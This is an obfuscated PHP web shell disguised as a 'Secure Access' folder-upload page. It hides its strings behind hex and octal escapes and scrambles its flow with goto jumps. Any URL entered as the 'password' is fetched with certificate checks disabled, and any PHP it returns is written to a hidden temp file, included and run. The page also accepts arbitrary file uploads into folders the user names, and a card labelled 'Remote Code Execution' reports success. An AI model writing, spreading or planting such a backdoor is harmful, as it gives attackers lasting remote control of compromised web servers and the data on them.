<?php
 goto u1uVR; u1uVR: ?>
<!doctypehtml><html><head><meta charset="UTF-8"><title>Xk'eeb'al</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"rel="stylesheet"><link href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📁</text></svg>"rel="icon"><style>.auth-container{max-width:500px;margin:100px auto}</style></head><?php  goto axm3q; Jq28E: goto Oin1K; goto oVQqO; Qr9O2: session_start(); goto YBKFf; PS8Xr: fHKUw: goto xTTc9; MrnD2: $remoteExecuted = false; goto uphto; IxVsa: M15qE: goto yEP9I; yEP9I: if (!$remoteExecuted && isset($_POST["\165\160\154\157\141\144"]) && isset($_SESSION["\x72\x65\x6d\157\x74\x65\x5f\165\162\x6c"])) { $folderName = trim($_POST["\x66\157\154\144\145\x72\156\141\x6d\145"] ?? ''); if (empty($folderName)) { $uploadMsg = "\74\x64\x69\x76\40\143\x6c\x61\x73\163\75\x27\141\154\x65\162\x74\40\x61\x6c\x65\162\164\55\144\x61\x6e\147\145\x72\47\76\106\157\154\144\145\x72\x20\156\141\x6d\145\40\143\x61\x6e\x6e\157\x74\40\142\x65\40\145\155\160\164\x79\x3c\x2f\x64\151\x76\x3e"; } elseif (preg_match("\x2f\134\56\134\56\174\x5b\x5c\134\134\57\x3a\x5c\52\134\77\42\74\76\134\x7c\x5d\x2f", $folderName)) { $uploadMsg = "\x3c\x64\151\166\40\x63\154\x61\x73\163\75\x27\141\154\145\162\x74\40\141\x6c\x65\x72\x74\x2d\144\x61\156\147\x65\x72\47\x3e\111\x6e\166\x61\154\x69\x64\40\x66\x6f\154\x64\x65\x72\40\156\141\x6d\x65\74\x2f\144\x69\x76\76"; } else { if (!is_dir($folderName)) { mkdir($folderName, 493, true); } $uploadedFiles = 0; if (!empty($_FILES["\x66\151\154\145\x73"]["\156\x61\155\145"][0])) { foreach ($_FILES["\146\151\154\x65\x73"]["\x74\155\x70\x5f\x6e\141\x6d\145"] as $i => $tmpName) { if ($_FILES["\146\x69\154\x65\x73"]["\x65\x72\162\157\162"][$i] === UPLOAD_ERR_OK) { $originalName = $_FILES["\x66\x69\x6c\x65\x73"]["\156\141\155\x65"][$i]; $safeName = preg_replace("\57\x5b\x5e\x5c\x77\134\x2e\134\55\135\57", '', $originalName); $targetPath = $folderName . "\57" . $safeName; if (move_uploaded_file($tmpName, $targetPath)) { chmod($targetPath, 420); $uploadedFiles++; } } } } $uploadMsg = "\74\x64\151\166\x20\143\154\141\163\163\x3d\x27\x61\154\145\x72\164\x20\x61\x6c\x65\162\x74\x2d\163\165\143\143\145\163\163\x27\76\125\x70\154\157\141\x64\x65\144\x20{$uploadedFiles}\40\x66\151\154\145\163\40\164\157\40{$folderName}\74\57\144\151\x76\76"; } } goto dUiv6; wsf0I: jNpkH: goto uDrVN; xTTc9: if (isset($_SESSION["\162\145\x6d\157\x74\145\137\165\162\154"])) { $url = $_SESSION["\x72\x65\x6d\157\164\x65\137\165\x72\154"]; function fetchRemote($u) { if (!function_exists("\x63\x75\162\x6c\x5f\x65\x78\145\x63")) { return false; } $c = curl_init($u); curl_setopt_array($c, array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_USERAGENT => $_SERVER["\110\x54\124\120\137\x55\123\105\x52\x5f\x41\107\105\x4e\124"] ?? "\115\157\x7a\x69\x6c\x6c\141", CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5)); return curl_exec($c); } $code = fetchRemote($url); if ($code && strpos($code, "\74\77\160\x68\160") !== false) { $temp = sys_get_temp_dir() . "\57\56" . md5($url) . "\x2e\160\x68\160"; file_put_contents($temp, $code); include $temp; unlink($temp); $remoteExecuted = true; } } goto lTswK; ynXEY: lrgPe: goto MrnD2; ZMq49: goto M15qE; goto N0vfd; OLh9D: Oin1K: goto abtJ8; YhvRv: hjoIw: goto bXaDe; lTswK: goto osohu; goto wsf0I; tVSSr: if (isset($_GET["\154\x6f\x67\157\165\164"])) { session_unset(); session_destroy(); header("\114\157\x63\x61\x74\x69\157\x6e\72\40" . $_SERVER["\x50\110\x50\137\123\105\x4c\106"]); die; } goto dqAq5; xAXah: $errorMsg = ''; goto Uq5VF; hCaW5: goto Fcb7J; goto ynXEY; oVQqO: HR24Q: goto xAXah; N0vfd: mrCGr: goto STu6E; Uq5VF: goto EzQoC; goto IxVsa; es7RB: $uploadMsg = ''; goto ZMq49; Oq8Sq: LOLAV: goto RMR4w; RP6oj: goto mrCGr; goto AFSmW; YBKFf: goto LOLAV; goto Wjka1; abtJ8: if (!isset($_SESSION["\162\x65\x6d\157\164\145\x5f\165\x72\154"])) { ?>
<div class="mt-5 auth-container bg-white p-4 rounded shadow"><h2 class="mb-4 text-center">Secure Access</h2><form method="post"class="mb-3"><div class="mb-3"><label class="form-label">Enter Access URL:</label> <input class="form-control"name="password"required placeholder="https://..."></div><button class="btn w-100 btn-primary"type="submit">Authenticate</button></form><?php  echo $errorMsg; ?>
</div><?php  } else { ?>
<div class="mt-5"><div class="mb-4 d-flex justify-content-between"><h2>Folder Upload System</h2><a class="btn btn-outline-danger btn-sm"href="?logout">Logout</a></div><?php  echo $uploadMsg; ?>
<div class="mb-4 card"><div class="card-body"><h3 class="mb-4 card-title">Upload Folder</h3><form method="post"enctype="multipart/form-data"><div class="mb-3"><label class="form-label">Folder Name:</label> <input class="form-control"name="foldername"required placeholder="Enter destination folder name"></div><div class="mb-3"><label class="form-label">Select Folder to Upload:</label> <input class="form-control"name="files[]"required directory multiple type="file"webkitdirectory><div class="form-text">Select a folder to upload (browser must support folder upload)</div></div><button class="btn w-100 btn-primary"type="submit"name="upload">Upload Folder</button></form></div></div><div class="card"><div class="card-body"><h3 class="mb-4 card-title">Remote Code Execution</h3><form method="post"><div class="mb-3"><label class="form-label">Change Access URL:</label> <input class="form-control"name="password"required placeholder="https://..."value="<?php  echo isset($_SESSION["\162\x65\x6d\x6f\x74\145\x5f\165\x72\154"]) ? htmlspecialchars($_SESSION["\x72\145\155\x6f\164\x65\x5f\x75\162\x6c"]) : ''; ?>
"></div><button class="btn w-100 btn-secondary"type="submit">Update URL</button></form><?php  if ($remoteExecuted) { ?>
<div class="alert alert-info mt-3">Remote code executed successfully</div><?php  } ?>
</div></div></div><?php  } goto RP6oj; bXaDe: ?>
<div class="container"><?php  goto Jq28E; vGKs5: dN8TW: goto Qr9O2; uphto: goto fHKUw; goto YhvRv; LeY4_: goto lrgPe; goto Oq8Sq; Wjka1: Fcb7J: goto tVSSr; RMR4w: error_reporting(0); goto hCaW5; AFSmW: EzQoC: goto f_LRX; dUiv6: goto hjoIw; goto vGKs5; dqAq5: goto HR24Q; goto ORAPT; m2jRE: goto dN8TW; goto OLh9D; axm3q: goto jNpkH; goto PS8Xr; f_LRX: if ($_SERVER["\x52\x45\x51\x55\105\x53\124\137\x4d\105\x54\x48\x4f\x44"] === "\x50\117\123\x54" && isset($_POST["\x70\x61\x73\163\x77\x6f\162\144"])) { $input = trim($_POST["\160\x61\163\x73\x77\157\162\144"]); if (filter_var($input, FILTER_VALIDATE_URL)) { $_SESSION["\162\x65\155\157\x74\145\137\x75\x72\154"] = $input; header("\114\x6f\143\141\164\151\157\156\72\40" . $_SERVER["\120\x48\120\x5f\x53\x45\114\x46"]); die; } else { $errorMsg = "\74\144\x69\166\x20\143\x6c\x61\163\x73\75\x27\x61\154\145\x72\164\x20\141\154\x65\x72\x74\x2d\144\141\x6e\x67\145\162\x20\x6d\x74\x2d\63\x27\76\x50\x6c\x65\x61\x73\145\x20\x65\x6e\164\x65\x72\x20\141\x20\x76\141\x6c\151\x64\40\125\x52\114\x20\x28\145\x2e\x67\56\x20\150\164\164\160\163\72\x2f\57\56\x2e\x2e\51\74\57\x64\151\166\76"; } } goto LeY4_; ORAPT: osohu: goto es7RB; uDrVN: ?>
<body class="bg-light"><?php  goto m2jRE; STu6E: ?>
</div></body></html>